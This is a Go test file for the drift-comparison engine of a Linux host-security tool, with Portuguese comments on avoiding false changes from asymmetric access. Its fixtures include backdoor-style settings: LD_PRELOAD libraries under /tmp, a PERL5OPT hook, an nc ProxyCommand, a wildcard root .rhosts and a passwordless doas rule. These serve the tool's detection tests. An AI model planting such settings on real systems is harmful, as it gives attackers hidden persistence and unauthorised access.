package drift

import (
	"reflect"
	"strconv"
	"strings"
	"testing"

	"github.com/lex0c/aletheia/internal/env"
	"github.com/lex0c/aletheia/internal/facts"
)

func unit(nome, exec string) facts.Unit {
	return facts.Unit{
		Name: nome, Path: "/etc/systemd/system/" + nome, Kind: "service",
		Exec: []facts.ExecLine{{Key: "ExecStart", Cmd: exec}},
	}
}

func lado(f *facts.Facts, caps env.Cap) Lado {
	return Lado{F: f, Caps: caps, Host: "h", Quando: "2026-01-01T00:00:00Z"}
}

const tudoVisivel = env.CapFilesystem | env.CapRoot

// A COMPARAÇÃO É POR DIREÇÃO, e o que a invalida é a ASSIMETRIA — não a
// limitação.
//
// A primeira versão era binária: os dois lados viram tudo, ou a família não é
// comparada. Contra um host real sem root isso recusou três das quatro
// famílias, por lacunas do tamanho de "6 diretórios de unit de usuário
// ilegíveis". Honesto e inútil, e inútil vira desligado.
func TestDirecaoSuprimidaPorAssimetria(t *testing.T) {
	casos := []struct {
		nome                  string
		capsAntes, capsDepois env.Cap
		lacunaAntes           bool
		lacunaDepois          bool
		semSurgiu, semSumiu   bool
		simetrico             bool
	}{
		{nome: "os dois viram tudo",
			capsAntes: tudoVisivel, capsDepois: tudoVisivel,
			simetrico: true},
		{nome: "os dois sem root: escopo, não defeito",
			capsAntes: env.CapFilesystem, capsDepois: env.CapFilesystem,
			semSurgiu: true, semSumiu: true, simetrico: true},
		{nome: "só o ANTES sem root: o que parece NOVO pode ser o que ele não viu",
			capsAntes: env.CapFilesystem, capsDepois: tudoVisivel,
			semSurgiu: true, simetrico: false},
		{nome: "só o DEPOIS sem root: o que parece REMOVIDO pode continuar lá",
			capsAntes: tudoVisivel, capsDepois: env.CapFilesystem,
			semSumiu: true, simetrico: false},
		{nome: "lacuna nos dois: escopo",
			capsAntes: tudoVisivel, capsDepois: tudoVisivel,
			lacunaAntes: true, lacunaDepois: true,
			semSurgiu: true, semSumiu: true, simetrico: true},
		{nome: "lacuna só no ANTES",
			capsAntes: tudoVisivel, capsDepois: tudoVisivel,
			lacunaAntes: true,
			semSurgiu:   true, simetrico: false},
		{nome: "lacuna só no DEPOIS",
			capsAntes: tudoVisivel, capsDepois: tudoVisivel,
			lacunaDepois: true,
			semSumiu:     true, simetrico: false},
	}
	classe := Classe{
		Tipo: "t", Titulo: "t", Requires: tudoVisivel, Lacunas: []string{"unit"},
	}
	for _, c := range casos {
		fa, fd := &facts.Facts{}, &facts.Facts{}
		if c.lacunaAntes {
			fa.Partial = map[string][]string{"unit": {"algo"}}
		}
		if c.lacunaDepois {
			fd.Partial = map[string][]string{"unit": {"algo"}}
		}
		got := comparabilidadeDe(classe, lado(fa, c.capsAntes), lado(fd, c.capsDepois))
		if got.SemSurgiu != c.semSurgiu || got.SemSumiu != c.semSumiu || got.Simetrico != c.simetrico {
			t.Errorf("%s:\n  surgiu=%v sumiu=%v simetrico=%v\n  queria  surgiu=%v sumiu=%v simetrico=%v",
				c.nome, got.SemSurgiu, got.SemSumiu, got.Simetrico,
				c.semSurgiu, c.semSumiu, c.simetrico)
		}
		if got.Restrita() && len(got.Motivos) == 0 {
			t.Errorf("%s: direção suprimida sem motivo dito — o operador não tem "+
				"como saber por que o silêncio não é resposta", c.nome)
		}
	}
}

// "MUDOU" SOBREVIVE A TODAS AS RESTRIÇÕES, e é o que torna a leitura por
// direção útil em vez de só honesta: ele exige a entidade presente nos DOIS
// lados, então nenhum dos dois pode ter deixado de olhá-la.
func TestMudouSobreviveASupressaoDeDirecao(t *testing.T) {
	antes := &facts.Facts{
		Units:   []facts.Unit{unit("a.service", "/usr/bin/env sleep 30")},
		Partial: map[string][]string{"unit": {"parcial dos dois lados"}},
	}
	depois := &facts.Facts{
		Units:   []facts.Unit{unit("a.service", "/usr/bin/env tail -f /dev/null")},
		Partial: map[string][]string{"unit": {"parcial dos dois lados"}},
	}
	d := Comparar(lado(antes, tudoVisivel), lado(depois, tudoVisivel))
	var achou bool
	for _, m := range d.Mudancas {
		if m.Tipo == "systemd.unit" && m.Kind == Mudou && m.Campo == "exec" {
			achou = true
			if !strings.Contains(m.Antes, "sleep 30") || !strings.Contains(m.Depois, "tail") {
				t.Errorf("o par antes/depois é o achado: %+v", m)
			}
		}
	}
	if !achou {
		t.Fatalf("mudança de ExecStart precisa sobreviver à lacuna simétrica: %+v", d.Mudancas)
	}
}

// E o outro lado da mesma regra: com a direção suprimida, "surgiu" e "sumiu"
// NÃO viram achado — viram declaração na cobertura.
func TestSurgiuESumiuCalamQuandoADirecaoNaoEhConfiavel(t *testing.T) {
	antes := &facts.Facts{Units: []facts.Unit{unit("velha.service", "/bin/true")}}
	depois := &facts.Facts{Units: []facts.Unit{unit("nova.service", "/bin/true")}}
	// A capacidade de que a família depende falta nos DOIS: as duas direções
	// caem, e o que sobraria seria "mudou" — que aqui não existe, porque as
	// entidades são outras.
	d := Comparar(lado(antes, 0), lado(depois, 0))
	for _, m := range d.Mudancas {
		if m.Kind == Surgiu || m.Kind == Sumiu {
			t.Errorf("direção suprimida não pode virar achado: %+v", m)
		}
	}
	var visto bool
	for _, c := range d.Cobertura {
		if c.Tipo == "systemd.unit" {
			visto = true
			if !c.Restrita() {
				t.Error("a cobertura precisa DIZER que a direção caiu")
			}
		}
	}
	if !visto {
		t.Fatal("toda família entra na cobertura da comparação, comparada ou não")
	}
}

// A MESMA NORMALIZAÇÃO NOS DOIS LADOS.
//
// O dump é redigido ao ser escrito; o host vivo não é. Sem normalizar os dois,
// `ExecStartPre=-plymouth --wait quit` vira `-p<redacted>` de um lado só, e
// NOVE units deste desktop "mudaram" sem nada ter mudado. Foi assim que o
// defeito apareceu — e é assim que ele volta se alguém tirar a redação daqui.
func TestRedacaoNaoInventaMudanca(t *testing.T) {
	vivo := &facts.Facts{Units: []facts.Unit{unit("p.service", "-plymouth --wait quit")}}
	// O que o dump.go grava depois de passar pelo redator.
	doDump := &facts.Facts{Units: []facts.Unit{unit("p.service", "-p<redacted> --wait quit")}}
	d := Comparar(lado(doDump, tudoVisivel), lado(vivo, tudoVisivel))
	for _, m := range d.Mudancas {
		if m.Campo == "exec" {
			t.Errorf("a redação de um lado só inventou drift: %+v", m)
		}
	}
}

// Campo que NÃO decide não vira achado — vira número. Um relatório que imprime
// todo mtime de toda atualização de pacote é um que ninguém lê depois da
// terceira execução; um que os corta em silêncio se lê como "cobri tudo".
func TestCampoQueNaoDecideEhContadoENaoImpresso(t *testing.T) {
	a := unit("a.service", "/bin/true")
	a.ModUTC = "2026-01-01T00:00:00Z"
	b := unit("a.service", "/bin/true")
	b.ModUTC = "2026-06-06T00:00:00Z"

	d := Comparar(
		lado(&facts.Facts{Units: []facts.Unit{a}}, tudoVisivel),
		lado(&facts.Facts{Units: []facts.Unit{b}}, tudoVisivel))
	if len(d.Mudancas) != 0 {
		t.Errorf("mtime não é campo de decisão: %+v", d.Mudancas)
	}
	if d.Contadas != 1 {
		t.Errorf("mas o número precisa sair: Contadas=%d", d.Contadas)
	}
}

// Identidade repetida não pode depender da ORDEM da coleta: duas entidades de
// mesmo ID precisam produzir o mesmo valor nos dois lados, senão a mesma
// máquina dá drift contra si mesma.
func TestIdentidadeRepetidaEhEstavel(t *testing.T) {
	c := Classe{Tipo: "t", Extrair: func(f *facts.Facts) []Entidade {
		return []Entidade{
			{ID: "x", Campos: map[string]string{"c": "a"}},
			{ID: "x", Campos: map[string]string{"c": "b"}},
		}
	}}
	invertida := Classe{Tipo: "t", Extrair: func(f *facts.Facts) []Entidade {
		return []Entidade{
			{ID: "x", Campos: map[string]string{"c": "b"}},
			{ID: "x", Campos: map[string]string{"c": "a"}},
		}
	}}
	ia, _ := indexar(c, &facts.Facts{})
	ib, _ := indexar(invertida, &facts.Facts{})
	um, outro := ia["x"].Campos["c"], ib["x"].Campos["c"]
	if um != outro {
		t.Errorf("a ordem da coleta decidiu o valor: %q vs %q", um, outro)
	}
}

// Toda classe registrada precisa declarar de que capacidade depende. Sem isso a
// comparabilidade dela é sempre "tudo certo", e a família passa a ser comparada
// entre retratos de alcance diferente sem ninguém saber.
func TestTodaClasseDeclaraDoQueDepende(t *testing.T) {
	for _, c := range classes {
		if c.Requires == 0 {
			t.Errorf("%s: não declara Requires — a comparação dela nunca seria "+
				"recusada por assimetria de alcance", c.Tipo)
		}
		if c.Extrair == nil || c.Titulo == "" || c.Tipo == "" {
			t.Errorf("%s: classe incompleta", c.Tipo)
		}
		// A EXIGÊNCIA É DA FAMÍLIA EFÊMERA, e só dela.
		//
		// A catraca cobrava `Decide` de todas, e o efeito foi o contrário do
		// pretendido: duas famílias cujo sinal é a PRESENÇA ganharam um campo
		// constante ("presente": "sim") só para passar aqui. Campo que nunca
		// muda declarado como campo que decide é catraca satisfeita com
		// mentira.
		//
		// Quem precisa mesmo é a efêmera: nela as duas presenças estão
		// suprimidas por definição, então sem `Decide` ela não consegue
		// reportar coisa nenhuma — seria comparação que nunca fala.
		if c.Efemera && len(c.Decide) == 0 {
			t.Errorf("%s: é efêmera e não tem campo que decide — as duas presenças "+
				"já estão suprimidas, então ela nunca reportaria nada", c.Tipo)
		}
		if c.Efemera && c.Exaustiva {
			t.Errorf("%s: efêmera E exaustiva se contradizem — uma diz que a "+
				"presença não é confiável, a outra que ela é completa", c.Tipo)
		}
	}
}

// TODO CAMPO QUE DECIDE PRECISA SER EXTRAÍDO — e este teste existe porque a
// conferência à mão pegou um que não era.
//
// `binds` estava declarado no Decide da unit e o extrator nunca o emitia: uma
// mudança em `BindPaths=` não produzia drift NEM lacuna. Silêncio limpo, que é
// o pior modo de falha desta base, e invisível para qualquer teste que só
// olhasse o que a ferramenta acha.
// fixtureDeTodasAsFamilias monta fatos com UMA entidade de cada família, para
// que todo extrator emita algo. O conteúdo não importa: o que as catracas medem
// é o CONJUNTO DE CHAVES, a cegueira declarada e a fonte.
func fixtureDeTodasAsFamilias() *facts.Facts {
	return &facts.Facts{
		Units: []facts.Unit{{Name: "u.service", Path: "/etc/systemd/system/u.service"}},
		Cron:  []facts.CronEntry{{File: "/etc/cron.d/x", Kind: "dropin", Cmd: "/bin/true"}},
		Sudoers: []facts.SudoRule{{File: "/etc/sudoers", Line: 1,
			Text: "root ALL=(ALL) ALL"}},
		SSHKeys: []facts.SSHKey{{User: "root", File: "/root/.ssh/authorized_keys",
			Type: "ssh-ed25519", Fingerprint: "SHA256:x"}},
		Accounts:    []facts.Account{{Name: "root", UID: 0}},
		Grupos:      []facts.Grupo{{Name: "sudo", GID: 27, Members: []string{"ana"}}},
		HooksInterp: []facts.HookInterp{{Fonte: "/etc/environment", Key: "PERL5OPT", Value: "-Mx"}},
		Loader: facts.Loader{
			SearchDirs: []facts.LoaderDir{{Dir: "/usr/lib", From: "/etc/ld.so.conf", Exists: true}},
			EnvVars:    []facts.EnvSetting{{File: "/etc/environment", Key: "LD_PRELOAD", Value: "/tmp/.so"}},
			EnvDeUnit: []facts.EnvDeUnit{{Unit: "u.service", Key: "LD_PRELOAD",
				Value: "/tmp/.u.so", DeclaradoEm: "/etc/systemd/system/u.service"}},
		},
		Suid:               []facts.SuidFile{{Path: "/usr/bin/sudo", Setuid: true}},
		Sockets:            []facts.Socket{{Proto: "tcp", State: "LISTEN", LocalIP: "0.0.0.0", LocalPort: 22, Comm: "sshd"}},
		Carregados:         []facts.ModuloCarregado{{Nome: "overlay", Arquivo: "/lib/modules/x/overlay.ko"}},
		Binfmt:             []facts.BinfmtRegistro{{Nome: "qemu-arm", Interpreter: "/usr/bin/qemu-arm"}},
		CACerts:            []facts.CACert{{File: "/etc/ssl/certs/ca.pem", Subject: "CN=x", Issuer: "CN=x"}},
		NSSModules:         []facts.NSSModule{{Fonte: "files", Paths: []string{"/lib/libnss_files.so.2"}, Servicos: []string{"passwd"}}},
		NSSServicos:        []facts.NSSService{{Nome: "passwd", Cadeia: []string{"files", "sss"}}},
		ShadowLido:         true,
		Processes:          []facts.Process{{PID: 1, Exe: "/usr/lib/systemd/systemd", UID: 0}},
		Boot:               []facts.LinhaDeBoot{{Fonte: "/proc/cmdline", Valor: "ro quiet", Rodando: true}},
		SSH:                facts.SSHConfig{Files: []string{"/etc/ssh/sshd_config"}, PermitRootLogin: "no"},
		SSHServerColetado:  true,
		SSHServerCompleto:  true,
		SSHChavesCompleto:  true,
		SSHClienteCompleto: true,
		DoasLido:           true,
		Triggers: []facts.Trigger{{File: "/etc/profile", Kind: "profile",
			Lines: []facts.TriggerLine{{N: 1, Text: "export PATH=/usr/bin"}}}},
		Modules:           []facts.ModuleConf{{File: "/etc/modprobe.d/x.conf", Kind: "install", Module: "foo", Cmd: "/bin/true"}},
		Helpers:           []facts.HelperDoKernel{{Nome: "core_pattern", Valor: "|/usr/lib/systemd/systemd-coredump", Alvo: "/usr/lib/systemd/systemd-coredump"}},
		BinfmtConfig:      []facts.BinfmtConfig{{Fonte: "/etc/binfmt.d/x.conf", Nome: "qemu", Interpreter: "/usr/bin/qemu"}},
		ConfigWeb:         []facts.ConfigWeb{{Path: "/var/www/.htaccess", Tipo: "htaccess"}},
		HostsLido:         true,
		ResolverLido:      true,
		CACertsCompleto:   true,
		HostTrustCompleto: true,
		SSHClientExec: []facts.SSHClientExec{{File: "/root/.ssh/config",
			Directive: "ProxyCommand", Escopo: "Host *", Command: "/usr/bin/nc %h %p"}},
		Doas:            []facts.DoasRule{{File: "/etc/doas.conf", Text: "permit nopass :wheel", Permit: true}},
		MAC:             facts.MAC{Configurado: "enforcing", Ativo: "enforcing"},
		Hosts:           []facts.HostEntry{{IP: "127.0.0.1", Names: []string{"localhost"}}},
		Resolver:        facts.Resolver{File: "/etc/resolv.conf", Nameservers: []string{"1.1.1.1"}},
		ConfiancaDeHost: []facts.ConfiancaDeHost{{Path: "/root/.rhosts", Conta: "root", Linhas: []string{"+"}, Curinga: true}},
	}
}

func TestTodoCampoQueDecideEhExtraido(t *testing.T) {
	f := fixtureDeTodasAsFamilias()
	for _, c := range classes {
		// Pelo INDEXAR e não pelo Extrair: a invariante é sobre a entidade que
		// de fato é comparada, e o índice acrescenta campo próprio (a
		// multiplicidade, quando a família a declara). Conferir a saída crua do
		// extrator deixaria esse campo de fora da conferência.
		idx, _ := indexar(c, f)
		ents := make([]Entidade, 0, len(idx))
		for _, e := range idx {
			ents = append(ents, e)
		}
		if len(ents) == 0 {
			t.Errorf("%s: o fixture não produziu entidade — o teste deixaria de "+
				"conferir esta família em silêncio", c.Tipo)
			continue
		}
		// TODA entidade, e não só a primeira: a exigência é que a família seja
		// HOMOGÊNEA. Foi este teste que pegou o defeito de modelagem —
		// `precarga` misturava ld.so.preload com hook de interpretador, e
		// `confianca` misturava CA com NSS. Além de o Decide virar uma união
		// que não vale para nenhum dos dois, a lacuna de UM coletor suprimia a
		// direção do OUTRO. Viraram famílias separadas.
		for i, e := range ents {
			for campo := range c.Decide {
				if _, ok := e.Campos[campo]; !ok {
					t.Errorf("%s: a entidade %d (%s) não carrega `%s`, que decide — "+
						"ou a família é heterogênea, ou a mudança nesse campo não "+
						"produziria drift nem lacuna", c.Tipo, i, e.ID, campo)
				}
			}
		}
	}
}

// A UNIÃO das chaves: uma chave que existia no ANTES e some no DEPOIS é uma
// mudança, e o laço que itera só o DEPOIS nunca a visita.
func TestChaveRemovidaEhComparada(t *testing.T) {
	c := Classe{
		Tipo: "t", Titulo: "t", Requires: env.CapFilesystem,
		Decide: map[string]bool{"some": true},
	}
	ea := Entidade{ID: "x", Campos: map[string]string{"some": "valia"}}
	eb := Entidade{ID: "x", Campos: map[string]string{}}
	var d facts.Drift
	compararClasse(c, facts.CoberturaDrift{Simetrico: true},
		map[string]Entidade{"x": ea}, map[string]Entidade{"x": eb}, nil, nil, &d)
	if len(d.Mudancas) != 1 || d.Mudancas[0].Depois != "" || d.Mudancas[0].Antes != "valia" {
		t.Fatalf("a chave que sumiu do lado de depois precisa ser comparada: %+v", d.Mudancas)
	}
}

// Entidade sem identidade estável não é comparada — e isso SAI DITO. Descartar
// em silêncio esconderia justamente a linha malformada, que é onde uma inserção
// estranha se esconde.
func TestEntidadeSemIdentidadeSaiNaCobertura(t *testing.T) {
	original := classes
	defer func() { classes = original }()
	classes = []Classe{{
		Tipo: "t", Titulo: "t", Requires: env.CapFilesystem,
		Decide: map[string]bool{"c": true},
		Extrair: func(*facts.Facts) []Entidade {
			return []Entidade{{ID: "", Campos: map[string]string{"c": "x"}}}
		},
	}}
	d := Comparar(lado(&facts.Facts{}, tudoVisivel), lado(&facts.Facts{}, tudoVisivel))
	if len(d.Cobertura) != 1 {
		t.Fatalf("%+v", d.Cobertura)
	}
	if !strings.Contains(strings.Join(d.Cobertura[0].Motivos, " "), "sem identidade estável") {
		t.Errorf("a entidade descartada precisa sair dita: %+v", d.Cobertura[0].Motivos)
	}
}

// CAMPO OBSERVACIONAL: vazio ali significa "não foi observado", e não "não
// existe". É a regra "sumir ≠ não olhar" descida ao nível do campo.
//
// O caso que a criou: o dono de um socket em escuta sai vazio quando o processo
// é de outro usuário e não se está como root. A mesma porta atendida pelo mesmo
// programa aparecia mudando de `sshd` para vazio — porque numa das coletas o
// dono não pôde ser lido.
func TestCampoObservacionalNaoInventaMudanca(t *testing.T) {
	c := Classe{
		Tipo: "t", Titulo: "t", Requires: env.CapFilesystem, Exaustiva: true,
		Decide:        map[string]bool{"dono": true, "comum": true},
		Observacional: map[string]bool{"dono": true},
	}
	comp := func(a, b map[string]string) []facts.MudancaDrift {
		var d facts.Drift
		compararClasse(c, facts.CoberturaDrift{Simetrico: true},
			map[string]Entidade{"x": {ID: "x", Campos: a}},
			map[string]Entidade{"x": {ID: "x", Campos: b}}, nil, nil, &d)
		return d.Mudancas
	}
	// Observado num lado e não no outro: não é mudança.
	if m := comp(map[string]string{"dono": "sshd"}, map[string]string{"dono": ""}); len(m) != 0 {
		t.Errorf("vazio em campo observacional é falta de observação: %+v", m)
	}
	if m := comp(map[string]string{"dono": ""}, map[string]string{"dono": "sshd"}); len(m) != 0 {
		t.Errorf("e vale nos dois sentidos: %+v", m)
	}
	// Observado nos DOIS e diferente: é mudança, e das boas.
	if m := comp(map[string]string{"dono": "sshd"}, map[string]string{"dono": "nc"}); len(m) != 1 {
		t.Errorf("dono trocado é o achado que a família existe para dar: %+v", m)
	}
	// E em campo COMUM, ir para vazio continua sendo mudança — tem de ser:
	// `options` de uma chave de SSH indo para vazio é o achado mais importante
	// da família de chaves.
	if m := comp(map[string]string{"comum": "restrict"}, map[string]string{"comum": ""}); len(m) != 1 {
		t.Errorf("em campo comum, ir para vazio É mudança: %+v", m)
	}
}

// FAMÍLIA EFÊMERA: a presença é volátil nos DOIS sentidos, e só `mudou` vale.
//
// Um `sleep` de cron rodando na segunda coleta e não na primeira não é um
// programa novo no host — é o relógio.
func TestFamiliaEfemeraSoReportaMudanca(t *testing.T) {
	original := classes
	defer func() { classes = original }()
	classes = []Classe{{
		Tipo: "t", Titulo: "t", Requires: env.CapFilesystem, Efemera: true,
		Decide: map[string]bool{"uids": true},
		Extrair: func(f *facts.Facts) []Entidade {
			var out []Entidade
			for i := range f.Processes {
				out = append(out, Entidade{ID: f.Processes[i].Exe,
					Campos: map[string]string{"uids": strconv.Itoa(f.Processes[i].UID)}})
			}
			return out
		},
	}}
	antes := &facts.Facts{Processes: []facts.Process{{Exe: "/a", UID: 0}}}
	depois := &facts.Facts{Processes: []facts.Process{
		{Exe: "/a", UID: 1000}, {Exe: "/efemero", UID: 0}}}
	d := Comparar(lado(antes, tudoVisivel), lado(depois, tudoVisivel))
	if len(d.Mudancas) != 1 || d.Mudancas[0].Kind != Mudou {
		t.Fatalf("só a mudança de identidade conta numa família efêmera: %+v", d.Mudancas)
	}
	if !d.Cobertura[0].Restrita() {
		t.Error("e a cobertura precisa DIZER que as duas presenças foram suprimidas")
	}
}

// A ASSIMETRIA DERRUBA TAMBÉM O `MUDOU`, e este teste é a prova que faltava.
//
// A versão anterior suprimia só as duas presenças, sob um comentário que
// afirmava: "mudou sobrevive a todas: exige a entidade presente nos DOIS lados,
// então nenhum pode não tê-la olhado". A frase confunde PRESENÇA DA ENTIDADE
// com OBSERVABILIDADE DO CAMPO — e `sem_senha` sai do /etc/shadow, que precisa
// de root:
//
//	ANTES  (root)     conta deploy  sem_senha=true
//	DEPOIS (sem root) conta deploy  sem_senha=false   ← não leu o shadow
//
// A ferramenta afirmava, com todas as letras, que a conta deixou de estar sem
// senha — enquanto a cobertura da MESMA execução dizia que a comparação era
// assimétrica.
func TestAssimetriaNaoInventaMudancaDeCampo(t *testing.T) {
	// Classe SINTÉTICA, e de propósito: o que se testa aqui é o MECANISMO —
	// assimetria derruba o `mudou` —, e amarrá-lo a uma família real faria o
	// teste morrer quando aquela família mudasse de dependência. Foi o que
	// aconteceu: `conta` deixou de consumir a chave `users` (ela cobre quatro
	// arquivos com privilégios diferentes) e este teste passou a medir outra
	// coisa. O caso concreto que o originou está logo abaixo, no seu lugar.
	original := classes
	defer func() { classes = original }()
	classes = []Classe{{
		Tipo: "t", Titulo: "t", Requires: env.CapFilesystem, Exaustiva: true,
		Lacunas: []string{"x"}, Decide: map[string]bool{"campo": true},
		Extrair: func(f *facts.Facts) []Entidade {
			v := "com-privilegio"
			if len(f.PersistDenied["x"]) > 0 {
				v = "sem-privilegio"
			}
			return []Entidade{{ID: "e", Campos: map[string]string{"campo": v}}}
		},
	}}
	comAcesso := &facts.Facts{}
	semAcesso := &facts.Facts{PersistDenied: map[string][]string{"x": {"não deu"}}}

	d := Comparar(
		Lado{F: comAcesso, Caps: tudoVisivel, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: semAcesso, Caps: tudoVisivel, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	if len(d.Mudancas) != 0 {
		t.Errorf("a diferença de ALCANCE virou mudança de campo: %+v", d.Mudancas)
	}
	if c := d.Cobertura[0]; c.Simetrico || !c.SemMudou {
		t.Errorf("a família precisa sair declarada como assimétrica e sem `mudou`: %+v", c)
	}
}

// E o caso concreto que originou a regra, agora no nível certo: os campos que
// vêm do /etc/shadow são OBSERVACIONAIS, e a família de contas não depende mais
// da chave larga. Root de um lado e não-root do outro não pode virar "a conta
// deixou de estar sem senha".
func TestShadowIlegivelDeUmLadoNaoViraMudancaDeSenha(t *testing.T) {
	conta := func(lido, semSenha bool) *facts.Facts {
		f := &facts.Facts{
			PasswdLido: true,
			ShadowLido: lido,
			Accounts:   []facts.Account{{Name: "deploy", UID: 1000, SemSenha: semSenha}},
		}
		if !lido {
			f.PersistDenied = map[string][]string{"users": {"/etc/shadow ilegível"}}
		}
		return f
	}
	d := Comparar(
		Lado{F: conta(true, true), Caps: tudoVisivel, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: conta(false, false), Caps: env.CapFilesystem, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	for _, m := range d.Mudancas {
		if m.Campo == "sem_senha" || m.Campo == "bloqueada" {
			t.Errorf("campo do shadow comparado sem o shadow: %+v", m)
		}
	}
}

// E o outro lado, que é o que faz a comparação servir sem root: limitação
// SIMÉTRICA não derruba o `mudou`. Os dois lados enxergaram com a mesma
// fidelidade, então a diferença é do host e não de quem olhou.
func TestLimitacaoSimetricaPreservaOMudou(t *testing.T) {
	conta := func(shell string) *facts.Facts {
		return &facts.Facts{
			Accounts:      []facts.Account{{Name: "deploy", UID: 1000, Shell: shell}},
			PersistDenied: map[string][]string{"users": {"/etc/shadow ilegível"}},
		}
	}
	d := Comparar(
		Lado{F: conta("/usr/sbin/nologin"), Caps: env.CapFilesystem, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: conta("/bin/bash"), Caps: env.CapFilesystem, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	var achou bool
	for _, m := range d.Mudancas {
		if m.Tipo == "conta" && m.Campo == "shell" {
			achou = true
		}
	}
	if !achou {
		t.Fatalf("shell que deixa de ser nologin é o achado, e as duas pontas "+
			"olharam igual: %+v", d.Mudancas)
	}
}

// A BATERIA DA REVISÃO. Cada um destes é um caso em que a representação
// normalizada perdia informação, ou em que cobertura incompleta podia ser
// confundida com estado — que é a tese central desta ferramenta aplicada ao
// próprio motor de comparação.

// NET1: o listener continua lá e a segunda leitura de /proc/net/tcp foi cortada.
// NÃO pode virar "sumiu", e a cobertura precisa cair.
func TestNET1TabelaTruncadaNaoViraPortaRemovida(t *testing.T) {
	porta := func() []facts.Socket {
		return []facts.Socket{{Proto: "tcp", State: "LISTEN", LocalIP: "0.0.0.0",
			LocalPort: 22, Comm: "sshd"}}
	}
	antes := &facts.Facts{Sockets: porta()}
	// A porta CONTINUA existindo; o que faltou foi ler a tabela inteira.
	depois := &facts.Facts{SocketsIncompletos: []string{"tcp"}}

	d := Comparar(
		Lado{F: antes, Caps: tudoVisivel, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: depois, Caps: tudoVisivel, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	for _, m := range d.Mudancas {
		if m.Tipo == "porta" {
			t.Errorf("tabela truncada virou estado: %s %s", m.Kind, m.ID)
		}
	}
	var vista bool
	for _, c := range d.Cobertura {
		if c.Tipo != "porta" {
			continue
		}
		vista = true
		if c.Simetrico || !c.SemSumiu {
			t.Errorf("a cobertura precisa cair, e do lado certo: %+v", c)
		}
	}
	if !vista {
		t.Fatal("a família precisa aparecer na cobertura")
	}
}

// NSS1: as mesmas fontes, a ORDEM invertida. A autoridade sobre quem é usuário
// deste host trocou de lado.
func TestNSS1OrdemDaCadeiaEhMudanca(t *testing.T) {
	nss := func(cadeia ...string) *facts.Facts {
		return &facts.Facts{NSSServicos: []facts.NSSService{{Nome: "passwd", Cadeia: cadeia}}}
	}
	d := Comparar(
		Lado{F: nss("files", "sss"), Caps: tudoVisivel, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: nss("sss", "files"), Caps: tudoVisivel, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	var achou bool
	for _, m := range d.Mudancas {
		if m.Tipo == "nss_servico" && m.Campo == "cadeia" {
			achou = true
		}
	}
	if !achou {
		t.Fatalf("inverter a cadeia troca quem responde primeiro: %+v", d.Mudancas)
	}
}

// NSS3: as mesmas fontes, na mesma ordem, e a AÇÃO trocada. `[NOTFOUND=return]`
// encerra a consulta onde `[NOTFOUND=continue]` passa para a próxima fonte —
// mesmo arquivo, comportamento efetivo diferente.
//
// A primeira versão descartava os blocos de ação por "não serem fonte". Verdade,
// e irrelevante: apagar semântica antes de comparar é o oposto do que esta
// representação existe para fazer.
func TestNSS3AcaoTrocadaEhMudanca(t *testing.T) {
	nss := func(acao string) *facts.Facts {
		return &facts.Facts{NSSServicos: []facts.NSSService{{
			Nome: "passwd", Cadeia: []string{"files", acao, "sss"}}}}
	}
	d := Comparar(
		Lado{F: nss("[notfound=return]"), Caps: tudoVisivel, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: nss("[notfound=continue]"), Caps: tudoVisivel, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	var achou bool
	for _, m := range d.Mudancas {
		if m.Tipo == "nss_servico" && m.Campo == "cadeia" {
			achou = true
		}
	}
	if !achou {
		t.Fatalf("a ação decide se a próxima fonte é consultada: %+v", d.Mudancas)
	}
}

// NSS2: uma fonte que já existia passa a atender OUTRO database. Nenhuma
// biblioteca nova, e o host passa a perguntar a ela quem tem qual senha.
func TestNSS2FonteEmNovoDatabaseEhMudanca(t *testing.T) {
	mod := func(servicos ...string) *facts.Facts {
		return &facts.Facts{NSSModules: []facts.NSSModule{{
			Fonte: "sss", Paths: []string{"/lib/libnss_sss.so.2"}, Servicos: servicos}}}
	}
	d := Comparar(
		Lado{F: mod("passwd"), Caps: tudoVisivel, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: mod("passwd", "shadow"), Caps: tudoVisivel, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	var achou bool
	for _, m := range d.Mudancas {
		if m.Tipo == "nss" && m.Campo == "servicos" {
			achou = true
		}
	}
	if !achou {
		t.Fatalf("a mesma lib atendendo o shadow é outra coisa: %+v", d.Mudancas)
	}
}

// A ENTRADA DO SHADOW QUE SOME é transição, e não só estado.
//
// `priv.account_no_shadow` já acusa a conta que está no passwd e não no shadow —
// é assinatura de edição à mão, porque o `useradd` escreve nos dois. O que
// faltava era a TRANSIÇÃO: a inconsistência não existia no retrato anterior, e é
// isso que datar o incidente exige.
func TestEntradaDoShadowQueSomeEhMudanca(t *testing.T) {
	conta := func(semShadow bool) *facts.Facts {
		return &facts.Facts{
			PasswdLido: true, ShadowLido: true,
			Accounts: []facts.Account{{Name: "deploy", UID: 1000, SemShadow: semShadow}},
		}
	}
	d := Comparar(
		Lado{F: conta(false), Caps: tudoVisivel, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: conta(true), Caps: tudoVisivel, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	var achou bool
	for _, m := range d.Mudancas {
		if m.Tipo == "conta" && m.Campo == "sem_shadow" {
			achou = true
		}
	}
	if !achou {
		t.Fatalf("a conta perdeu a entrada no shadow entre os dois retratos: %+v", d.Mudancas)
	}
	// E sem o shadow lido, o campo não é comparado — vazio ali é "não
	// observado", como os outros dois que vêm da mesma fonte.
	semLeitura := func() *facts.Facts {
		f := conta(false)
		f.ShadowLido = false
		return f
	}
	d = Comparar(
		Lado{F: semLeitura(), Caps: tudoVisivel, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: conta(true), Caps: tudoVisivel, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	for _, m := range d.Mudancas {
		if m.Campo == "sem_shadow" {
			t.Errorf("sem o shadow lido, o campo não é comparável: %+v", m)
		}
	}
